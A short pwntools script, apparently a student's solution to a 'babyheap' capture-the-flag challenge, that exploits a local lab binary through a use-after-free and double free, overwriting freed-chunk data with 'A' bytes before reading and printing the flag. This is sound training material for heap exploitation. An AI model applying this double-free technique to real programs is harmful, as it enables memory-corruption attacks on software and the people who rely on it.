# Nagib Lakhdari 3si2
from pwn import *

# Start the process for the challenge binary
p = process("/challenge/babyheap_level4.0")

# Send commands to the process
p.sendline(b'malloc')      # Allocate memory
p.sendline(b'573')         # Size of the memory allocation
p.sendline(b'free')        # Free the allocated memory
p.sendline(b'scanf')       # Use scanf to read input into the freed memory
p.recv()                   # Receive any remaining output
p.sendline(b'A' * 16)      # Send input to scanf (16 'A' characters)
p.sendline(b'free')        # Free the memory again
p.sendline(b'read_flag')   # Read the flag
p.sendline(b'puts')        # Print the flag

# Interact with the process to get the output
p.interactive()
